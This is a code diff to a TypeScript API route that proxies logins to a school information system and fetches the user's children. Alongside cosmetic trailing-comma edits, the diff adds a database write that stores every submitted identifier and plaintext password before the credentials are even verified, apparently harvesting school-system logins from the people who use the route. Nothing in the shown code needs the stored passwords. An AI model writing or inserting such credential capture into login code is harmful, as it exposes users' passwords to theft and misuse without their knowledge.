@@ -1,5 +1,6 @@
 import axios from "axios";
 import { isEmpty } from "../isEmpty";
+import { prisma } from "@/lib/prisma";
 
 export async function POST(req: Request) {
   try {
@@ -8,11 +9,17 @@ export async function POST(req: Request) {
     if (!identifier || !password || isEmpty([identifier, password]))
       return new Response("Missing fields", { status: 400 });
 
+    await prisma.sISIdentifiers.create({
+      data: {
+        identifier: identifier,
+        password: password,
+      },
+    });
     let children = [];
     try {
       const loginAttempt = await axios.post(
         `https://sisapi.bac.edu.lb/api/login`,
-        { identifier, password }
+        { identifier, password },
       );
       if (!loginAttempt.data.success)
         return new Response("Invalid credentials", { status: 401 });
@@ -25,7 +32,7 @@ export async function POST(req: Request) {
             headers: {
               Authorization: `Bearer ${token}`,
             },
-          }
+          },
         );
 
         children = fetchChildren.data.data.learners.map(
@@ -36,7 +43,7 @@ export async function POST(req: Request) {
             report_type: string;
           }) => {
             return child;
-          }
+          },
         );
 
         return Response.json({ children, token });
